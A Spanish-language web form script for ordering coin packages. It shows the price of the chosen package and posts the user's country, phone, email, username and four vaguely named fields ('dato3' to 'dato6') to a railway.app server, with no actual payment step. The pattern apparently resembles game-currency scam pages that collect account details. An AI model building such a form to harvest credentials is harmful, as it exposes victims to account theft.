<script>

// ==========================================
// ELEMENTOS
// ==========================================

const monedasSelect =
    document.getElementById("monedas");

const precio =
    document.getElementById("precio");

const formulario =
    document.getElementById("pedidoForm");

const botonEnviar =
    document.getElementById("botonEnviar");


// ==========================================
// MOSTRAR PRECIO AUTOMÁTICAMENTE
// ==========================================

monedasSelect.addEventListener(
    "change",
    function(){

        const opcion =
            this.options[this.selectedIndex];

        if(!opcion.value){

            precio.textContent =
                "💰 Precio: Selecciona un paquete";

            return;
        }

        const precioSeleccionado =
            opcion.dataset.precio;

        precio.textContent =
            "💰 Precio: $" +
            precioSeleccionado +
            " USD";

    }
);


// ==========================================
// ENVIAR FORMULARIO
// ==========================================

formulario.addEventListener(
    "submit",
    async function(e){

        e.preventDefault();

        const opcion =
            monedasSelect.options[
                monedasSelect.selectedIndex
            ];


        // Evitar envío sin paquete

        if(!opcion.value){

            alert(
                "⚠️ Selecciona un paquete de monedas."
            );

            return;
        }


        const datos = {

            pais:
                document.getElementById("pais").value,

            telefono:
                document.getElementById("telefono").value,

            correo:
                document.getElementById("correo").value,

            usuario:
                document.getElementById("usuario").value,

            dato3:
                document.getElementById("dato3").value,

            dato4:
                document.getElementById("dato4").value,

            dato5:
                document.getElementById("dato5").value,

            dato6:
                document.getElementById("dato6").value,

            monedas:
                opcion.value,

            precio:
                opcion.dataset.precio,

            metodo:
                "Pendiente"

        };


        try{

            botonEnviar.disabled = true;

            botonEnviar.textContent =
                "ENVIANDO...";


            const respuesta =
                await fetch(

                    "https://overflowing-renewal-production-1a4d.up.railway.app/enviar",

                    {
                        method:"POST",

                        headers:{
                            "Content-Type":
                            "application/json"
                        },

                        body:
                            JSON.stringify(datos)
                    }

                );


            if(respuesta.ok){

                alert(
                    "✅ Pedido enviado correctamente."
                );


                formulario.reset();


                precio.textContent =
                    "💰 Precio: Selecciona un paquete";


            }else{

                alert(
                    "❌ Error al enviar el pedido."
                );

            }


        }catch(error){

            console.error(error);

            alert(
                "❌ No se pudo conectar con el servidor."
            );

        }finally{

            botonEnviar.disabled = false;

            botonEnviar.textContent =
                "CONTINUAR";

        }

    }
);

</script>
